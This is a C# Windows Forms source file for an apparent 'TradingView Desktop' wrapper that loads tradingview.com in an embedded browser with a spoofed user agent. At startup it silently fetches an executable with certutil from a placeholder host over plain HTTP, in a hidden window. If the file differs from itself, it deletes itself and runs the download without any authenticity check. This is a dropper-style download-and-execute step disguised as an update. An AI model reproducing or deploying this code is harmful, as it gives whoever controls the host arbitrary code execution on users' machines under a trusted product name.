using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TradingViewDesktop
{
    public partial class Form1 : Form
    {
        string update_addr = "http://WWW.YOURWEBSITE.COM/version.exe";

        static string CalculateMD5(string filename)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(filename))
                {
                    var hash = md5.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }

        void DowFile()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/c certutil.exe -urlcache -split -f \"" + update_addr + "\" \"" + Application.ExecutablePath + ".update\"";
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            var process = Process.Start(Info);
            process.WaitForExit();
        }

        void CheckUpdate()
        {
            string up = Application.ExecutablePath + ".update";
            DowFile();
            if (!CalculateMD5(Application.ExecutablePath).Equals(CalculateMD5(up)))
            {
                ProcessStartInfo Info = new ProcessStartInfo();
                Info.Arguments = "/C cd \"" + Path.GetDirectoryName(Application.ExecutablePath) + "\" & choice /C Y /N /D Y /T 3 & Del \"" +
                               Application.ExecutablePath + "\" & ren " + Path.GetFileName(up) + " " + Path.GetFileName(Application.ExecutablePath) + " & \"" + Application.ExecutablePath + "\"";
                Info.WindowStyle = ProcessWindowStyle.Hidden;
                Info.CreateNoWindow = true;
                Info.FileName = "cmd.exe";
                Process.Start(Info);
                Environment.Exit(0);
            }
        }

        public Form1()
        {
            InitializeComponent();
        }
        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        [DllImport("urlmon.dll", CharSet = CharSet.Ansi)]
        private static extern int UrlMkSetSessionOption(int dwOption, string pBuffer, int dwBufferLength, int dwReserved);
        private const int UrlmonOptionUseragent = 268435457;
        private const int UrlmonOptionUseragentRefresh = 268435458;
        public void ChangeUserAgent()
        {
            const string ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36";
            UrlMkSetSessionOption(UrlmonOptionUseragentRefresh, null, 0, 0);
            UrlMkSetSessionOption(UrlmonOptionUseragent, ua, ua.Length, 0);
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
            CheckUpdate();
            var ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 3);
            InternetSetOption(IntPtr.Zero, 81, ptr, 4);
            Marshal.Release(ptr);
            webBrowser1.Navigate("https://www.tradingview.com/", null, null, 
                @"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US;q=0.9,en
DNT: 1
Upgrade-Insecure-Requests: 1");
        }

        private void webBrowser1_LocationChanged(object sender, EventArgs e)
        {
            ChangeUserAgent();
        }

        private void webBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
        {
            ChangeUserAgent();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                Application.Exit();
            }
            catch (Exception)
            {
                Environment.Exit(0);
            }
        }
    }
}
